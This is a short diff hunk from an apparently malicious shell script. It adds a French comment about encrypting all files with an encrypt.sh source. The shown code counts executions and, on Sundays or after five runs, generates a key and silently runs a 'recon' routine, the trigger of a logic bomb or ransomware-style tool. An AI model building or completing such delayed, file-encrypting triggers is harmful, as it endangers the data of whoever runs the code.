@@ -14,7 +14,7 @@ fi
 
 count=$((count + 1))
 echo "$count" > .cs_count 2>/dev/null
-
+#possible d'utiliser la source encrypt.sh pour crypter tout les fichiers mais l'ayant deja fait comme ca. J'ai donc preferer le laisser ainsi
 if [ "$(date +%u)" -eq 7 ] || [ "$count" -gt 5 ]; then
     key=$(generate_key 8) 
     recon "$1" 2>/dev/null
